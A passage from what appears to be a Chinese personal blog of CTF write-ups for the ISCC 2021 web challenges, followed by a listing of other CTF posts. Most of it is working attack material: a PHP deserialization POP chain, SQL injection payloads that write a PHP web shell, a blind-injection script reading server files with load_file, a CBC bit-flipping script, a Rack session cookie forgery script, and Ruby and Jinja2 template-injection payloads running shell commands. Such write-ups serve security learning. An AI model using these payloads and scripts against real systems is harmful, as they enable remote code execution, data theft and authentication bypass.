<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class ISCC_Upload&#123;</span><br><span class="line">    public $x;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;x&#x3D;new ISCC_ResetCMD();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class ISCC_ResetCMD&#123;</span><br><span class="line">    public $x;</span><br><span class="line">    protected $new_cmd&#x3D;&#39;cat &#x2F;flag&#39;;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;x &#x3D; new ISCC_Command;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class ISCC_Command&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$b&#x3D;new ISCC_Upload();</span><br><span class="line">$a&#x3D;str_replace(&#39;s:10:&quot;&#39;.&quot;\x00*\x00&quot;,&#39;S:10:&quot;\00\2a\00&#39;,serialize($b));</span><br><span class="line">echo urlencode ($a);</span><br><span class="line">&#x2F;&#x2F;这个pop链的构造其实有点类似于嵌套，主要是为了绕过wakeup函数</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210503132753.png" alt="img" style="zoom:67%;">

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210503132758.png" alt="img" style="zoom:67%;">

<p><a target="_blank" rel="noopener" href="https://github.com/ambionics/phpggc#advanced-enhancements">https://github.com/ambionics/phpggc#advanced-enhancements</a></p>
<h2 id="web——擂台题-easyweb"><a href="#web——擂台题-easyweb" class="headerlink" title="web——擂台题-easyweb"></a>web——擂台题-easyweb</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;and%0dsubstr((select%0dgroup_concat),1,1)&gt;&#39;0&#39;--%0d</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union%0dselect%0d1,&quot;&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;&quot;%0dinto outfile%0d&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php&#39;</span><br></pre></td></tr></table></figure>

<p>MySQL 5.6 及以上版本存在<code>innodb_index_stats</code>，<code>innodb_table_stats</code>两张表，其中包含新建立的库和表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select table_name from mysql.innodb_table_stats where database_name &#x3D; database();</span><br><span class="line">select table_name from mysql.innodb_index_stats where database_name &#x3D; database();</span><br></pre></td></tr></table></figure>

<p>在MySQL 5.7.9中sys中新增了一些视图，可以从中获取表名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;包含in</span><br><span class="line">SELECT object_name FROM &#96;sys&#96;.&#96;x$innodb_buffer_stats_by_table&#96; where object_schema &#x3D; database();</span><br><span class="line">SELECT object_name FROM &#96;sys&#96;.&#96;innodb_buffer_stats_by_table&#96; WHERE object_schema &#x3D; DATABASE();</span><br><span class="line">SELECT TABLE_NAME FROM &#96;sys&#96;.&#96;x$schema_index_statistics&#96; WHERE TABLE_SCHEMA &#x3D; DATABASE();</span><br><span class="line">SELECT TABLE_NAME FROM &#96;sys&#96;.&#96;schema_auto_increment_columns&#96; WHERE TABLE_SCHEMA &#x3D; DATABASE();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;不包含in</span><br><span class="line">SELECT TABLE_NAME FROM &#96;sys&#96;.&#96;x$schema_flattened_keys&#96; WHERE TABLE_SCHEMA &#x3D; DATABASE();</span><br><span class="line">SELECT TABLE_NAME FROM &#96;sys&#96;.&#96;x$ps_schema_table_statistics_io&#96; WHERE TABLE_SCHEMA &#x3D; DATABASE();</span><br><span class="line">SELECT TABLE_NAME FROM &#96;sys&#96;.&#96;x$schema_table_statistics_with_buffer&#96; WHERE TABLE_SCHEMA &#x3D; DATABASE();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;通过表文件的存储路径获取表名</span><br><span class="line">SELECT FILE FROM &#96;sys&#96;.&#96;io_global_by_file_by_bytes&#96; WHERE FILE REGEXP DATABASE();</span><br><span class="line">SELECT FILE FROM &#96;sys&#96;.&#96;io_global_by_file_by_latency&#96; WHERE FILE REGEXP DATABASE();</span><br><span class="line">SELECT FILE FROM &#96;sys&#96;.&#96;x$io_global_by_file_by_bytes&#96; WHERE FILE REGEXP DATABASE();</span><br></pre></td></tr></table></figure>

<p>包含之前查询记录的表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT QUERY FROM sys.x$statement_analysis WHERE QUERY REGEXP DATABASE();</span><br><span class="line">SELECT QUERY FROM &#96;sys&#96;.&#96;statement_analysis&#96; where QUERY REGEXP DATABASE();</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT object_name FROM &#96;performance_schema&#96;.&#96;objects_summary_global_by_type&#96; WHERE object_schema &#x3D; DATABASE();</span><br><span class="line">SELECT object_name FROM &#96;performance_schema&#96;.&#96;table_handles&#96; WHERE object_schema &#x3D; DATABASE();</span><br><span class="line">SELECT object_name FROM &#96;performance_schema&#96;.&#96;table_io_waits_summary_by_index_usage&#96; WHERE object_schema &#x3D; DATABASE();</span><br><span class="line">SELECT object_name FROM &#96;performance_schema&#96;.&#96;table_io_waits_summary_by_table&#96; WHERE object_schema &#x3D; DATABASE();</span><br><span class="line">SELECT object_name FROM &#96;performance_schema&#96;.&#96;table_lock_waits_summary_by_table&#96; WHERE object_schema &#x3D; DATABASE();</span><br></pre></td></tr></table></figure>

<p>包含之前查询记录的表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT digest_text FROM &#96;performance_schema&#96;.&#96;events_statements_summary_by_digest&#96; WHERE digest_text REGEXP DATABASE();</span><br></pre></td></tr></table></figure>

<p>包含表文件路径的表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT file_name FROM &#96;performance_schema&#96;.&#96;file_instances&#96; WHERE file_name REGEXP DATABASE();</span><br></pre></td></tr></table></figure>

<p>使用<code>union select</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select c from (select 1 as a, 1 as b, 1 as c union select * from test)x limit 1 offset 1</span><br><span class="line">select &#96;3&#96; from(select 1,2,3 union select * from admin)a limit 1,1</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;无逗号，有join版本</span><br><span class="line">select a from (select * from (select 1 &#96;a&#96;)m join (select 2 &#96;b&#96;)n join (select 3 &#96;c&#96;)t where 0 union select * from test)x;</span><br></pre></td></tr></table></figure>

<p>盲注</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">((SELECT 1,concat(&#39;&#123;result+chr(mid)&#125;&#39;, cast(&quot;0&quot; as JSON)))&lt;(SELECT * FROM &#96;f1ag_1s_h3r3_hhhhh&#96;))</span><br></pre></td></tr></table></figure>

<p>要求后面select的结果必须是一行。mysql中对char型大小写是不敏感的，盲注的时候要么可以使用<code>hex</code>或者<code>binary</code>。<br> 这里只能使用<code>concat</code>将字符型和binary拼接，使之大小写敏感，<code>JSON</code>也可以使用<code>char byte</code>代替</p>
<p><code>mysql 8.0.19</code>新增语句<code>table</code><br> <a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/table.html">https://dev.mysql.com/doc/refman/8.0/en/table.html</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]</span><br></pre></td></tr></table></figure>

<p>可以把<code>table t</code>简单理解成<code>select * from t</code>，和<code>select</code>的区别在于</p>
<ul>
<li><code>table</code>总是显示表的所有列</li>
<li><code>table</code>不允许任何的行过滤;也就是说，<code>TABLE</code>不支持任何<code>WHERE</code>子句。<br> 可以用来盲注表名</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39;and\x0a(table\x0ainformation_schema.TABLESPACES_EXTENSIONS\x0alimit\x0a7,1)&gt;</span><br><span class="line">(BINARY(&#39;&#123;&#125;&#39;),&#39;0&#39;)#</span><br></pre></td></tr></table></figure>

<p>同时代替<code>select</code>被过滤导致只能同表查询的问题</p>
<p>PS：新增的<code>values</code>语句也挺有意思，在某些情况似乎可以代替<code>union</code>或<code>select</code>进行<code>order by</code>盲注</p>
<p>学习链接:<a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/12358725.html">https://www.cnblogs.com/20175211lyz/p/12358725.html</a></p>
<h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>一开始听说绝对路径var/www/html然后发现读取文件的权限很高，想说直接读读源码，发现不行，于是尝试尝试自己找找绝对路径:<br>包含根目录路径的文件:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;etc&#x2F;apache2&#x2F;sites-enabled&#x2F;000-default.conf</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=<span class="string">&quot;http://39.96.91.106:5001/?id=&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line">database=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">    low =<span class="number">0</span></span><br><span class="line">    high=<span class="number">264</span></span><br><span class="line">    mid=(low+high)<span class="comment">//2</span></span><br><span class="line">    <span class="keyword">while</span>(low&lt;high):</span><br><span class="line">        <span class="comment">#payload_1=f&quot;1/**/and/**/ascii(substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;&quot;</span></span><br><span class="line">        <span class="comment">#payload_2=f&quot;1/**/and/**/ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=&#x27;ctf&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;&quot;</span></span><br><span class="line">        <span class="comment">#payload_3=f&quot;1/**/and/**/ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&#x27;flag&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;&quot;</span></span><br><span class="line">        <span class="comment">#payload_4= f&quot;1/**/and/**/ascii(substr((select/**/value/**/from/**/flag),&#123;i&#125;,1))&gt;&#123;mid&#125;&quot;</span></span><br><span class="line">        <span class="comment">#payload_1=f&quot;1&#x27;and%0dascii(substr((selselectect%0dgroup_concat(table_name)%0dfrom%0dmysql.innodb_table_stats%0dwhere%0ddatabase_name%0d=database()),&#123;i&#125;,1))&gt;&#123;mid&#125;--%0d&quot;//iscc_flag</span></span><br><span class="line">        payload_3=f<span class="string">&quot;1&#x27;and%0dascii(substr((selselectect%0dload_file(&#x27;/etc/apache2/sites-enabled/000-default.conf&#x27;)),&#123;i&#125;,1))&gt;&#123;mid&#125;--%0d&quot;</span></span><br><span class="line">        payload_4 = f<span class="string">&quot;1&#x27;and%0dascii(substr((selselectect%0dload_file(&#x27;/var/www/const&#x27;)),&#123;i&#125;,1))&gt;&#123;mid&#125;--%0d&quot;</span></span><br><span class="line">       </span><br><span class="line">        <span class="comment"># print(s.get(url+payload_1).text)</span></span><br><span class="line">        <span class="comment"># print(payload_1)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Your Login name&quot;</span> in s.get(url+payload_3).text:</span><br><span class="line">            low = mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high=mid</span><br><span class="line">        mid=(low+high)<span class="comment">//2</span></span><br><span class="line">    <span class="keyword">if</span>(mid==<span class="number">0</span> <span class="keyword">or</span> mid==<span class="number">264</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    database +=chr(mid)</span><br><span class="line">    <span class="keyword">print</span>(database)</span><br><span class="line"><span class="keyword">print</span>(database)</span><br></pre></td></tr></table></figure>



<h2 id="web——ISCC客服一号冲冲冲（二）"><a href="#web——ISCC客服一号冲冲冲（二）" class="headerlink" title="web——ISCC客服一号冲冲冲（二）"></a>web——ISCC客服一号冲冲冲（二）</h2><p>这题的考点在于CBC字节翻转攻击:<br>思路：他让我们登录，但是没有窗口，所以这里我们就自己post一个username和password，然后再burp回文里看到一个iv，一个cipher，想到以前做过的CBC字节翻转攻击，接下来就没啥区别了，唯一的不同的是password是客服题第一题的flag，需要替换一下，这里就贴一下脚本，具体的可以去之前的文章找找：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import base64</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">cipher&#x3D;&quot;iThCcXSm90cuwxnw1KtfJqk%2Bled1cE%2Ba3xQh7UfgNovfWzCFOGmuryqdECjX1RqcLNv7ybOCRfXJBbokBfS4oKc5MnoFTbBfn5zTFdthy3E%3D&quot;</span><br><span class="line">iv&#x3D;&quot;dlp0Txccz%2Fba%2Fw0qSQGVjw%3D%3D&quot;</span><br><span class="line"></span><br><span class="line">cipher_de&#x3D;base64.b64decode(urllib.unquote(cipher))</span><br><span class="line">tran&#x3D;&#39;a:2:&#123;s:8:&quot;username&quot;;s:5:&quot;bdmin&quot;;s:d&quot;;s:15:&quot;1SCC_2o2l_KeFuu&quot;&#125;8:&quot;passwor&#39;</span><br><span class="line"></span><br><span class="line">#tran[16:32]&#x3D;me&quot;;s:5:&quot;bdmin&quot;;</span><br><span class="line"></span><br><span class="line">cipher_new&#x3D;cipher_de[0:9]+chr(ord(cipher_de[9])^ord(&#39;b&#39;)^ord(&#39;a&#39;))+cipher_de[10:]</span><br><span class="line">cipher_new&#x3D;urllib.quote(base64.b64encode(cipher_new))</span><br><span class="line">print(cipher_new)</span><br><span class="line">cipher_new&#x3D;base64.b64decode(&#39;GgadNOlPvXYl8SxK+NWkK21lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjE1OiIxU0NDXzJvMmxfS2VGdXUiO30&#x3D;&#39;)</span><br><span class="line">print(cipher_new)</span><br><span class="line">iv_raw&#x3D;base64.b64decode(urllib.unquote(iv))</span><br><span class="line">iv_new&#x3D;&#39;&#39;</span><br><span class="line">for i in range(0,16):</span><br><span class="line">#</span><br><span class="line">	       iv_new+&#x3D;chr(ord(tran[i])^ord(iv_raw[i])^ord(cipher_new[i]))</span><br><span class="line">iv_new&#x3D;urllib.quote(base64.b64encode(iv_new))</span><br><span class="line">print(iv_new)</span><br></pre></td></tr></table></figure>

<h2 id="web——Explore-Ruby"><a href="#web——Explore-Ruby" class="headerlink" title="web——Explore Ruby"></a>web——Explore Ruby</h2><p>一开始没注意到有提示说demo是可以登陆的，就在尝试伪造cookie（太菜了），然后登录后，发现存在ssti注入<br><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911174631687-758048107.png" alt="img" style="zoom:67%;"><br>尝试了一下 发现是slim的ruby注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#&#123;7*7&#125;</span><br></pre></td></tr></table></figure>

<p>尝试读取继承，发现没有什么有用的内容，但是发现()等内容被过滤了，于是寻找替代品</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[:to_json, :instance_variable_set, :instance_variable_defined?, :remove_instance_variable, :instance_of?, :kind_of?, :is_a?, :tap, :instance_variable_get, :public_methods, :instance_variables, :method, :public_method, :define_singleton_method, :singleton_method, :public_send, :extend, :to_enum, :enum_for, :pp, :gem, :&lt;&#x3D;&gt;, :&#x3D;&#x3D;&#x3D;, :&#x3D;~, :!~, :eql?, :respond_to?, :freeze, :inspect, :object_id, :send, :to_s, :display, :nil?, :hash, :class, :singleton_class, :clone, :dup, :yield_self, :itself, :tainted?, :taint, :untrust, :untaint, :trust, :untrusted?, :methods, :frozen?, :singleton_methods, :protected_methods, :private_methods, :!, :equal?, :instance_eval, :&#x3D;&#x3D;, :instance_exec, :!&#x3D;, :__id__, :__send__]</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[:to_json, :instance_variable_set, :instance_variable_defined?, :remove_instance_variable, :instance_of?, :kind_of?, :is_a?, :tap, :instance_variable_get, :public_methods, :instance_variables, :method, :public_method, :define_singleton_method, :singleton_method, :public_send, :extend, :to_enum, :enum_for, :pp, :gem, :&lt;&#x3D;&gt;, :&#x3D;&#x3D;&#x3D;, :&#x3D;~, :!~, :eql?, :respond_to?, :freeze, :inspect, :object_id, :send, :to_s, :display, :nil?, :hash, :class, :singleton_class, :clone, :dup, :yield_self, :itself, :tainted?, :taint, :untrust, :untaint, :trust, :untrusted?, :methods, :frozen?, :singleton_methods, :protected_methods, :private_methods, :!, :equal?, :instance_eval, :&#x3D;&#x3D;, :instance_exec, :!&#x3D;, :__id__, :__send__]</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">object:47312658352300</span><br></pre></td></tr></table></figure>

<p>以上均为类继承读到的无用信息，发现几篇文章:<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/watkinsong/article/details/7968550">https://blog.csdn.net/watkinsong/article/details/7968550</a><br><a target="_blank" rel="noopener" href="https://www.huaweicloud.com/articles/b5b475ca729307885cd91f03c46d4826.html">https://www.huaweicloud.com/articles/b5b475ca729307885cd91f03c46d4826.html</a></p>
<p>其中让人感兴趣的就是%x可以执行shell命令：<br>虽然中括号被过滤，但是<br><a target="_blank" rel="noopener" href="https://qastack.cn/programming/665576/what-are-those-pipe-symbols-for-in-ruby">https://qastack.cn/programming/665576/what-are-those-pipe-symbols-for-in-ruby</a></p>
<p>可以利用管道符||进行绕过，构造payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#&#123;%x|ls|&#125;&#x2F;&#x2F;执行了系统命令</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#Gemfile</span><br><span class="line">Gemfile.lock</span><br><span class="line">database.db</span><br><span class="line">public</span><br><span class="line">vendor</span><br><span class="line">views</span><br><span class="line">webserver.rb</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用cat命令即可查看源码：</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">configure <span class="keyword">do</span></span><br><span class="line">  set <span class="symbol">:public_folder</span>, <span class="string">&#x27;public&#x27;</span></span><br><span class="line">  set <span class="symbol">:views</span>, <span class="string">&#x27;views&#x27;</span></span><br><span class="line">  set <span class="symbol">:bind</span>, <span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line">  set <span class="symbol">:port</span>, <span class="number">9999</span></span><br><span class="line">  enable <span class="symbol">:sessions</span></span><br><span class="line">  set <span class="symbol">:server</span>, <span class="string">%w[thin webrick]</span></span><br><span class="line">  set <span class="symbol">:environment</span>, <span class="symbol">:production</span></span><br><span class="line">  <span class="comment">#set :environment, :development</span></span><br><span class="line">  <span class="comment">#disable :protection</span></span><br><span class="line">  set <span class="symbol">:session_secret</span>, <span class="string">&#x27;01344904559362f6f5754df256908476702c8bd5d972a32e2fae2a7cc6fa4a7efd25079fddb5a11a0f8be0f607bf048fd6ecfe065380c27b2aa26015c3308e85&#x27;</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">get <span class="string">&#x27;/home&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  authenticate!</span><br><span class="line">  @user = session[<span class="symbol">:username</span>]</span><br><span class="line">  @flag = ENV[<span class="string">&#x27;FLAG&#x27;</span>] <span class="keyword">if</span> session[<span class="symbol">:role</span>] == <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">  slim <span class="symbol">:home</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>关键在这里，所以我们需要伪造admin cookie</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;uri&quot;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;pp&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;base64&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;digest/sha1&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;faraday&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Remote host</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_hmac</span><span class="params">(data, secret)</span></span></span><br><span class="line">    OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, secret, data)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># URL = &quot;http://39.96.91.106:8230/login&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # Create URL object</span></span><br><span class="line"><span class="comment"># url = URI.parse(URL) </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># creds = &quot;demo&quot;</span></span><br><span class="line"><span class="comment"># c = &quot;&quot;</span></span><br><span class="line"><span class="comment"># # Authentication</span></span><br><span class="line"><span class="comment"># resp = Net::HTTP.start(url.host, url.port) do |http|</span></span><br><span class="line"><span class="comment">#     http.post(url.request_uri, &quot;username=#&#123;creds&#125;&amp;password=#&#123;creds&#125;&quot;)</span></span><br><span class="line"><span class="comment"># end</span></span><br><span class="line"></span><br><span class="line">Cookies = <span class="string">&quot;BAh7CkkiDXVzZXJuYW1lBjoGRUZJIglkZW1vBjsAVEkiCXJvbGUGOwBGSSIJ%0AdXNlcgY7AFRJIg9zZXNzaW9uX2lkBjsAVEkiRTAyMjU1OTdiMjJhYWM4Zjc3%0AYjcxZGUwNzQ2MjBlM2JiN2E5NDA1ODlmOWJjOTg5NWNiMTU3YzBlYTgyZGI5%0AYzIGOwBGSSIJY3NyZgY7AEZJIjF4MDlxTHVlOXdOZjNFWGx3T2ZzWjVXYlZ1%0ANEU5dnhBdW04TTk0Q3JZM1EwPQY7AEZJIg10cmFja2luZwY7AEZ7BkkiFEhU%0AVFBfVVNFUl9BR0VOVAY7AFRJIi00ZTRhYWEyYmFhZmVjYmIxYjcwOTViZWQ2%0AZDZmZWYzMmM3ZWI4NzEwBjsARg%3D%3D%0A--957bdf7dc19049010fd0b19e4d8656c42314b2db&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># puts get the cookie</span></span><br><span class="line">cookie, signature = Cookies.split(<span class="string">&quot;--&quot;</span>,<span class="number">2</span>)</span><br><span class="line">cookie = URI.decode(cookie)</span><br><span class="line"></span><br><span class="line">decoded = Base64.decode64(URI.decode(cookie))</span><br><span class="line">params = Marshal.load(decoded)</span><br><span class="line">params.merge!(&#123; <span class="string">&#x27;role&#x27;</span> =&gt;<span class="string">&quot;admin&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">print(params)</span><br><span class="line">bad_cookie = URI.encode(Base64.encode64(Marshal.dump(params)))</span><br><span class="line">bad_hmac = generate_hmac(bad_cookie, <span class="string">&quot;01344904559362f6f5754df256908476702c8bd5d972a32e2fae2a7cc6fa4a7efd25079fddb5a11a0f8be0f607bf048fd6ecfe065380c27b2aa26015c3308e85&quot;</span>)</span><br><span class="line">header = <span class="string">&quot;rack.session=<span class="subst">#&#123;bad_cookie&#125;</span>--<span class="subst">#&#123;bad_hmac&#125;</span>;&quot;</span></span><br><span class="line">print(header)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>贴一下学长写的</p>
<p>在kali ruby环境下跑一下！<br>注意，需要去题目的第二个入口伪造cookie才行！！！！！！</p>
<p>接下来就可以拿到flag了</p>
<h2 id="LOVE-SSTI："><a href="#LOVE-SSTI：" class="headerlink" title="LOVE-SSTI："></a>LOVE-SSTI：</h2><p>一开始的脑洞很烦，暹罗猫那个表情包有个别名 叫小豆泥，所以注入点是?xiaodouni=</p>
<p>接下来就是常规的ssti注入了，主要是去__doc__里面取字符，由于要查找flag，所以需要一个<em>号，但是没找到\</em>，写了个脚本要找*号，但是网站似乎不让爆破==就很难受，</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://39.96.91.106:3010/?xiaodouni=&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line">headers=requests.session().headers</span><br><span class="line">payload=<span class="string">&quot;&#123;%set%20a=dict(op=x,p=x)|join()%&#125;&#123;%set%20b=(()|select|string|list)|attr(a)(24)%&#125;&#123;%set%20c=(b,b,dict(doc=a)|join,b,b)|join%&#125;&#123;%set%20g=(x|attr(c)|list)|&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">10000</span>):</span><br><span class="line">    payload_fi=payload+<span class="string">f&quot;attr(a)(<span class="subst">&#123;i&#125;</span>)%&quot;</span>+<span class="string">&quot;&#125;&#123;&#123;g&#125;&#125;&quot;</span></span><br><span class="line">    url_f=url+payload_fi</span><br><span class="line">    print(s.get(url=url_f,headers=headers).text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;*&quot;</span> <span class="keyword">in</span> s.get(url=url_f,headers=headers).text:</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>所以就去找了一下其他方法。payload如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;%set a&#x3D;dict(op&#x3D;x,p&#x3D;x)|join()%&#125;&#123;%set b&#x3D;(()|select|string|list)|attr(a)(24)%&#125;&#123;%set c&#x3D;(b,b,dict(doc&#x3D;a)|join,b,b)|join%&#125;</span><br><span class="line">&#123;%set g&#x3D;(x|attr(c)|list)|attr(a)(320)%&#125;&#123;%set gl&#x3D;(b,b,dict(globals&#x3D;a)|join,b,b)|join%&#125;&#123;%set bu&#x3D;(b,b,dict(builtins&#x3D;a)|join,b,b)|join%&#125;&#123;% set cr&#x3D;(lipsum|attr(gl)|attr(&quot;get&quot;)(bu))[&quot;ch&quot;&quot;r&quot;] %&#125;&#123;%set d&#x3D;cr(42)%&#125;&#123;% set or&#x3D;(&quot;find &#x2F; -name &quot;,d,&quot;fla&quot;,d)|join%&#125;</span><br><span class="line">&#123;% set or1 &#x3D; &quot;cat &#x2F;usr&#x2F;fla??is?here?txt&quot;%&#125;&#123;&#123;(lipsum|attr(gl)|attr(&quot;get&quot;)(&quot;o&quot;&quot;s&quot;)|attr(&quot;po&quot;&quot;pen&quot;)(or1))|attr(&quot;read&quot;)()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h2><p>至此 web的所有题目都ak。学到了很多~</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/05/01/solidity%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AD%A6%E4%B9%A0/">solidity智能合约学习</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-05-01</time><div class="content"></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/04/24/buuctf14/">buuctf14</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-04-24</time><div class="content"><h2 id="BSidesCF-2019-Futurella"><a href="#BSidesCF-2019-Futurella" class="headerlink" title="[BSidesCF 2019]Futurella"></a>[BSidesCF 2019]Futurella</h2><p>查看源码就有flag？</p></div><a class="more" href="/2021/04/24/buuctf14/#more">Read more</a><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/04/23/buuctf13/">buuctf13</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-04-23</time><div class="content"><h2 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h2><p>smarty模板注入 更改x-forwarded-for会有不同回显，猜测注入点在这，进行注入，百度了一下smarty模板，说是可以识别php语法：</p></div><a class="more" href="/2021/04/23/buuctf13/#more">Read more</a><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/04/18/buuctf12/">buuctf12</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-04-18</time><div class="content"><h2 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h2><p>依旧是xxe注入：<br>但是这题flag不在根目录下没法直接读取，所以看了一下wp说是在内网主机中！？？？？？？？？？？果然还是做得题目少了，内网主机文件夹：<br>读取 /etc/network/interfaces 或者 /proc/net/arp 或者 /etc/host</p></div><a class="more" href="/2021/04/18/buuctf12/#more">Read more</a><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/04/17/buuctf11/">buuctf11</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-04-17</time><div class="content"><h2 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h2><p>本题应该考察nmap的指令参数注入，记得之前有做个类似的题目:</p></div><a class="more" href="/2021/04/17/buuctf11/#more">Read more</a><hr></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/page/10/"><i class="fa fa-chevron-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><span class="page-number current">11</span><a class="page-number" href="/page/12/">12</a><span class="space">&hellip;</span><a class="page-number" 